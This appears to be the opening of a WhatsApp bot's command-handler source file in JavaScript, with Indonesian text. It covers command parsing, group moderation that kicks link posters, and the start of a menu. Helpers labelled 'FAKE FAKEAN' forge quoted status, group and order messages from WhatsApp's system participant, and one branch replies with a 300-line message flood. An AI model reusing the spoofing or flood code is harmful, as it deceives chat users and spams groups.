/*
 ≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠
 ɪɴғᴏ sᴄ : ᴢᴇʀᴏ ʏᴛ𝟽 ( ᴏʀɪ ) 
 ɴᴀᴍʙᴀʜ ғɪᴛᴜʀ : ᴍʙᴘ_𝟷𝟽 
 ʀᴇᴄᴏᴅᴇ : 
 
 ᴡᴛғ ᴄᴜᴍᴀ ʀᴇᴄᴏᴅᴇ ʜᴀᴘᴜs ᴄʀᴇᴅɪᴛs ᴀᴡᴏᴋᴀᴡᴏᴋ"
 ≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠
 𝕯𝖔𝖓𝖙 𝕱𝖔𝖗𝖌𝖊𝖙 𝕱𝖔𝖑𝖑𝖔𝖜 𝕾𝖔𝖈𝖎𝖆𝖑 𝕸𝖊𝖉𝖎𝖆 𝕸𝖊 ^_^
 
 𝗬𝗼𝘂𝘁𝘂𝗯𝗲 : 𝗠𝗕𝗣_𝟭𝟳 (http://bit.ly/hehe) 
 𝗜𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺 : 𝗯𝗮𝘆𝘂.𝗸𝗲𝗰𝗰𝗲_ (https://instagram.com/hehe_) 
 𝗧𝗶𝗸𝗧𝗼𝗸 : @𝗽𝘂𝘀𝗲𝗿𝟭𝟮𝟯𝟲 (https://tiktok.com/@wanjer) 
 𝗙𝗮𝗰𝗲𝗯𝗼𝗼𝗸 : 𝗫𝗶𝗺𝗮𝘅.𝗚𝘇 (https://www.facebook.com/hadeh) 
 𝗚𝗶𝘁𝗵𝘂𝗯 : 𝗕𝗮𝘆𝘂𝘀𝗵𝗮𝘆 (https://github.com/tesss) 
 ≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈
*/



let { fetchJosn, kyun, fetchText } = require('./lib/fetcher')
let { color, bgcolor } = require('./lib/color')
let  { yta, ytv, igdl, upload, formatDate } = require('./lib/ytdl')
let { wait, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, start, info, success, close } = require('./lib/functions')

let
	{
		WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		waChatKey,
		mentionedJid,
		processTime,
	} = require("@adiwajshing/baileys")
const fs = require("fs")
const axios = require('axios')
const speed = require("performance-now")
const util = require('util')
const crypto = require('crypto')
const request = require('request')
const yts = require('yt-search')
const { exec, spawn } = require('child_process')
const fetch = require('node-fetch')
const moment = require('moment-timezone')
const ffmpeg = require('fluent-ffmpeg')
const { removeBackgroundFromImageFile } = require('remove.bg')
const { donasi } = require('./lib/donasi')
const { mediafireDl } = require('./lib/mediafire.js')

//━━━━━━━━━━━━━━━[ DATABASE ]━━━━━━━━━━━━━━━━━//

let _antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))
let _antivirtex = JSON.parse(fs.readFileSync('./database/antivirtex.json'))
let setting = JSON.parse(fs.readFileSync('./setting.json'))
let pendaftar = JSON.parse(fs.readFileSync('./database/user.json'))
let nsfww = JSON.parse(fs.readFileSync('./database/nsfww.json'))

//━━━━━━━━━━━━━━━[ SETTING ]━━━━━━━━━━━━━━━━━//

owner = setting.OwnerNumber
botname = setting.BotName
zerokey = setting.ZeroKey
ownername = setting.OwnerName
zerkey = setting.ZerKey
monkey = setting.MonKey
bayuapi = setting.BayuApi
rakuapi = setting.RakuApi
dapapi = setting.DapApi
nightapi = setting.NightApi
hunterapi = setting.HunterApi
menusimpel = false

//━━━━━━━━━━━━━━━[ MODUL EXPORTS ]━━━━━━━━━━━━━━━━━//

module.exports = zeroyt7 = async (zeroyt7, mek, _welkom) => {
	try {
        if (!mek.hasNewMessage) return
        mek = mek.messages.all()[0]
		if (!mek.message) return
		if (mek.key && mek.key.remoteJid == 'status@broadcast') return
		global.blocked
        	mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
        let content = JSON.stringify(mek.message)
		let from = mek.key.remoteJid
		let { text, extendedText, contact, contactsArray, groupInviteMessage, listMessage, buttonsMessage, location, liveLocation, image, video, sticker, document, audio, product, quotedMsg } = MessageType
		let time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		let jam = moment().tz("Asia/Jakarta").format("HH:mm:ss");
	    let wita = moment.tz('Asia/Makassar').format('HH:mm:ss')
		let wib = moment.tz('Asia/Jakarta').format('HH:mm:ss')
		let wit = moment.tz('Asia/Jayapura').format('HH:mm:ss')
        let type = Object.keys(mek.message)[0]        
        let cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
        let prefix = /^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*@,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*,;]/gi) : '-'          	
        body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'videoMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'extendedTextMessage') && mek.message[type].text.startsWith(prefix) ? mek.message[type].text : (type == 'listResponseMessage') && mek.message[type].singleSelectReply.selectedRowId ? mek.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId : ''
		budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		let command = body.slice(1).trim().split(/ +/).shift().toLowerCase()		
		let args = body.trim().split(/ +/).slice(1)
		let isCmd = body.startsWith(prefix)
		let dtod = "6285894327468@s.whatsapp.net"
        let otod = "6285894327468@s.whatsapp.net"
        let zeroo = "Hentongers 😈"
		let q = args.join(' ')
		let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
		let d = new Date
		let locale = 'id'
		let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
		let week = d.toLocaleDateString(locale, { weekday: 'long' })
		let calender = d.toLocaleDateString(locale, {
				day: 'numeric',
				month: 'long',
				year: 'numeric'
		       })
		let Verived = "0@s.whatsapp.net"
		let txt = mek.message.conversation
		let botNumber = zeroyt7.user.jid
		let ownerNumber = [`${owner}@s.whatsapp.net`, `6285894327468@s.whatsapp.net`]
		let isGroup = from.endsWith('@g.us')
		let sender = isGroup ? mek.participant : mek.key.remoteJid
		let totalchat = await zeroyt7.chats.all()
		let groupMetadata = isGroup ? await zeroyt7.groupMetadata(from) : ''
		let groupName = isGroup ? groupMetadata.subject : ''
		let groupId = isGroup ? groupMetadata.jid : ''
		let groupMembers = isGroup ? groupMetadata.participants : ''
		let groupDesc = isGroup ? groupMetadata.desc : ''
		let groupOwner = isGroup ? groupMetadata.owner : ''
		let groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		let isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		let isGroupAdmins = groupAdmins.includes(sender) || false
		let isNsfw = isGroup ? nsfww.includes(from) : false
		let conts = mek.key.fromMe ? zeroyt7.user.jid : zeroyt7.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        let pushname = mek.key.fromMe ? zeroyt7.user.name : conts.notify || conts.vname || conts.name || '-'
        
		let isAntiLink = isGroup ? _antilink.includes(from) : false
		let isWelkom = isGroup ? _welkom.includes(from) : false
		let isAntiVirtex = isGroup ? _antivirtex.includes(from) : false
		let isOwner = ownerNumber.includes(sender)
		let isUser = pendaftar.includes(sender)
		let isMybot = isOwner || mek.key.fromMe
		
//━━━━━━━━━━━━━━━[ CONNECTION 1 ]━━━━━━━━━━━━━━━━━//

		mess = {
			wait: '[ ! ] Sabar Sedang Di Proses Nih 😏...',
			success: 'Done Jangan Lupa ☕ NONTON HENTONGERS ☕',
			error: {
				stick: 'Gagal Convert Gambar To Sticker...Coba Lagi ! 🤔',
				Iv: 'Linknya Error Anjir :v'
			},
			only: {
				admin: 'ONLY ADMIN GRUB',
				group: 'Hanya Bisa Di Group Saja 😉', 
			
			}
		}
		faketeks = 'Hentongers 😈'
		let isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }
        let reply = (teks) => {
            zeroyt7.sendMessage(from, teks, text, {quoted:mek})
        }
        let sendMess = (hehe, teks) => {
            zeroyt7.sendMessage(hehe, teks, text)
        }
        let mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? zeroyt7.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : zeroyt7.sendMessage(from, teks.trim(), extendedText, { quoted: ftrol, contextInfo: { "mentionedJid": memberr } })
        }
        let zero = fs.readFileSync ('./zeroyt7/zerothumb.jpg')
        let costum = (pesan, tipe, target, target2) => {
			zeroyt7.sendMessage(from, pesan, tipe, { quoted: { key: { fromMe: false, participant: `${target}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target2}` } } })
		}
		let runtime = function (seconds) {
  seconds = Number(seconds);
  var d = Math.floor(seconds / (3600 * 24));
  var h = Math.floor((seconds % (3600 * 24)) / 3600);
  var m = Math.floor((seconds % 3600) / 60);
  var s = Math.floor(seconds % 60);
  var dDisplay = d > 0 ? d + (d == 1 ? " hari, " : " Hari, ") : "";
  var hDisplay = h > 0 ? h + (h == 1 ? " jam, " : " Jam, ") : "";
  var mDisplay = m > 0 ? m + (m == 1 ? " menit, " : " Menit, ") : "";
  var sDisplay = s > 0 ? s + (s == 1 ? " detik" : " Detik") : "";
  return dDisplay + hDisplay + mDisplay + sDisplay;
};
var ase = new Date();//New Jams
                        var jamss = ase.getHours();
                         switch(jamss){
                case 0: jamss = "Selamat Malam🌚 Jangan Begadang Ya"; break;
                case 1: jamss = "Selamat Malam🌚 Jangan Begadang Ya"; break;
                case 2: jamss = "Selamat Malam🌚 Jangan Begadang Ya"; break;
                case 3: jamss = "Selamat Malam🌚 Jangan Begadang Ya"; break;
                case 4: jamss = "Jangan lupa sholat Subuh kak"; break;
                case 5: jamss = "Selamat pagi🌝 Jangan Lupa Sarapan"; break;
                case 6: jamss = "Selamat pagi🌝 Jangan Lupa Sarapan"; break;
                case 7: jamss = "Selamat pagi🌝 Jangan Lupa Sarapan"; break;
                case 8: jamss = "Selamat pagi🌝"; break;
                case 9: jamss = "Selamat pagi🌝"; break;
                case 10: jamss = "Selamat pagi🌞"; break;
                case 11: jamss = "Selamat siang🌞"; break;
                case 12: jamss = "Jangan lupa sholat Zuhur kak"; break;
                case 13: jamss = "Selamat siang🌞"; break;
                case 14: jamss = "Selamat sore✨"; break;
                case 15: jamss = "Jangan lupa sholat Ashar kak"; break;
                case 16: jamss = "Selamat sore✨"; break;
                case 17: jamss = "Selamat sore✨"; break;
                case 18: jamss = "Selamat malam🌘"; break;
                case 19: jamss = "Jangan lupa sholat Isya kak"; break;
                case 20: jamss = "Selamat malam🌒"; break;
                case 21: jamss = "Selamat malam🌑"; break;
                case 22: jamss = "Selamat malam🌑"; break;
                case 23: jamss = "Selamat malam🌑"; break;
            }
            var tampilUcapan = "" + jamss;
    let readmore = "͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏";
     const sotoy = ['🍊 : 🍒 : 🍐','🍒 : 🔔 : 🍊','🍇 : 🍇 : 🍇','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔',		'🍐 : 🍒 : 🍋','🍐 : 🍐 : 🍐','🍊 : 🍒 : 🍒','🔔 : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇','🔔 : 🔔 : 🔔','🍒 : 🍒 : 🍒','🍌 : 🍌 : 🍌']
            const sotoy2 = ['🍊 : 🍒 : 🍐','🍒 : 🔔 : 🍊','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔',		'🍐 : 🍒 : 🍋','🍊 : 🍒 : 🍒','🔔 : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇']
            const sotoy1 = ['🍊 : 🍒 : 🍐','🍒 : 🔔 : 🍊','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔',		'🍐 : 🍒 : 🍋','🍊 : 🍒 : 🍒','?? : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇']
            const sotoy3 = ['🔔 : 🔔 : 🔔','🍒 : 🍒 : 🍒','🍌 : 🍌 : 🍌']
            const buruh1 = ['🐳','🦈','🐬','🐋','🐟','🐠','🦐','🦑','🦀','🐚']
            const buruh2 = ['🐔','🦃','🐿','🐐','🐏','🐖','🐑','🐎','🐺','🦩']
            const buruh3 = ['🦋','🕷','🐝','🐉','🦆','🦅','🕊','🐧','🐦','🦇']
            const buruh11 = buruh1[Math.floor(Math.random() * (buruh1.length))]
		    const buruh22 = buruh2[Math.floor(Math.random() * (buruh2.length))]
		    const buruh33 = buruh3[Math.floor(Math.random() * (buruh3.length))]
		const listmsg = (from, title, desc, list) => { // ngeread nya pake rowsId, jadi command nya ga keliatan
            let po = zeroyt7.prepareMessageFromContent(from, {"listMessage": {"title": title,"description": desc,"buttonText": "LIST MENU","footerText": "Subscribe Youtube ☕ NONTON HENTONGERS ☕\nSupport Me To 1K Subscribe","listType": "SINGLE_SELECT","sections": list}}, {})
            return zeroyt7.relayWAMessage(po, {waitForAck: true})
        }
        
//━━━━━━━━━━━━━━━[ BUTTON ]━━━━━━━━━━━━━━━━━//

        let sendButton = async (from, context, fortext, but, mek) => {
            buttonMessages = {
                contentText: context,
                footerText: fortext,
                buttons: but,
                headerType: 1
            }
            zeroyt7.sendMessage(from, buttonMessages, buttonsMessage, {
                quoted: ftrol
            })
        }
        let sendButImage = async (from, context, fortext, img, but, mek) => {
            jadinya = await zeroyt7.prepareMessage(from, img, image)
            buttonMessagesI = {
                imageMessage: jadinya.message.imageMessage,
                contentText: context,
                footerText: fortext,
                buttons: but,
                headerType: 4
            }
            zeroyt7.sendMessage(from, buttonMessagesI, buttonsMessage, {
                quoted: ftrol,
            })
        }
        async function sendButLocation(id, text1, desc1, gam1, but = [], options = {}) {
            let buttonMessages = { locationMessage: { jpegThumbnail: gam1 }, contentText: text1, footerText: desc1, buttons: but, headerType: 6 }
            return zeroyt7.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
        }

//━━━━━━━━━━━━━━━[ FAKE FAKEAN ]━━━━━━━━━━━━━━━━━//
        
   const fakestatus = (teks) => {
            zeroyt7.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": faketeks,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./zeroyt7/zero.jpg'), 
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        const faketroli = {

key: {

fromMe: false,

participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: 'status@broadcast' } : {})

},

message: { 

orderMessage: {

itemCount: 1643697,

status: 200, 

surface: 200,

message: `${pushname}\n➸ ${command}`,

orderTitle: 'Ntah', 

thumbnail: fs.readFileSync('./zeroyt7/zero.jpg')

//sellerJid: '0@s.whatsapp.net'

}

}

}
        zeroyt7.chatRead(from, "read")
        const fakegroup = (teks) => {
            zeroyt7.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": faketeks,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./zeroyt7/zero.jpg'), 
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        const ftrol = {
	key : {
                          participant : '0@s.whatsapp.net'
                        },
       message: {
                    orderMessage: {
                            itemCount : 2609812,
                            status: 1,
                            surface : 1,
                            message: `HENTONGERS 😎`, 
                            orderTitle: `HENTONGERS 😎`,
                            thumbnail: zero, //Gambarnye
                            sellerJid: '0@s.whatsapp.net' 
                          }
                        }
                      }   
  
//━━━━━━━━━━━━━━━[ CONNECTION 2 ]━━━━━━━━━━━━━━━━━//

        let sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './stik' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './stik' + names + '.png'
                    let asw = './stik' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        zeroyt7.sendMessage(to, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
        let sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                let fn = Date.now() / 10000;
                let filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    zeroyt7.sendMessage(to, media, type, { quoted: ftrol, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            }   
            if (budy.includes("https://chat.whatsapp.com/")) {
if (!isGroup) return
if (!isAntiLink) return
if (isGroupAdmins) return
var kic = `${sender.split("@")[0]}@s.whatsapp.net`
reply(` *「 GROUP LINK DETECTOR 」*\nKamu mengirimkan link grup chat, maaf kamu di kick dari grup :(`)
setTimeout(() => {
zeroyt7.groupRemove(from, [kic]).catch((e) => { reply(`BOT HARUS JADI ADMIN`) })
}, 0)
}

		if (budy.length > 3500) {
if (!isGroup) return
if (!isAntiVirtex) return
if (isGroupAdmins) return
reply('Tandai telah dibaca\n'.repeat(300))
reply(`「 *VIRTEX DETECTOR* 」\n\nKamu mengirimkan virtex, maaf kamu di kick dari group :(`)
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
zeroyt7.groupRemove(from, [sender])
}     
if (isCmd && !isUser){
          pendaftar.push(sender)
          fs.writeFileSync('./database/user.json', JSON.stringify(pendaftar, null, 2))
        }

//━━━━━━━━━━━━━━━[ CONNECTION 3 ]━━━━━━━━━━━━━━━━━//

		colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		let isMedia = (type === 'imageMessage' || type === 'videoMessage')
		let isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		let isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		let isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		let isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
      	if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
      	//if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
     	if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
      	//if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
        function jsonformat(string) {
return JSON.stringify(string, null, 2)
}


//━━━━━━━━━━━━━━━[ MENU ]━━━━━━━━━━━━━━━━━//

switch (command) {
	case 'menu':
	case 'help':
	case 'bayu':
	timestamp = speed();
latensi = speed() - timestamp	
img = fs.readFileSync('./zeroyt7/zero.jpg')
varr =
`Hallo 😊 ${pushname} IM Hentongers 😈 Semoga Hari Mu Menyesatkan KWOKWOKWOK CANDA KOK 🤣🤣🤣`
lett =
`━━━━[ BOT INFO ]━━━━
👤 Creator 👤 : Hentongers 😎
🐣 Prefix 🐣 : Multi Prefix
🦄 Mode 🦄 : Public-Mode
🗿 Lib 🗿 : Baileys
